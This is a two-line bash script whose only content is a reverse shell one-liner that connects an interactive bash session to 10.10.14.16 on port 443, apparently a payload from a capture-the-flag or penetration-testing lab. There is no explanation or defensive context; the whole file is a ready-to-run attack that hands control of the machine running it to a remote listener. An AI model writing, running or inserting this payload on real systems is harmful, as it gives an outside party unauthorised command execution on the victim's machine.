#!/bin/bash

bash -i >& /dev/tcp/10.10.14.16/443 0>&1
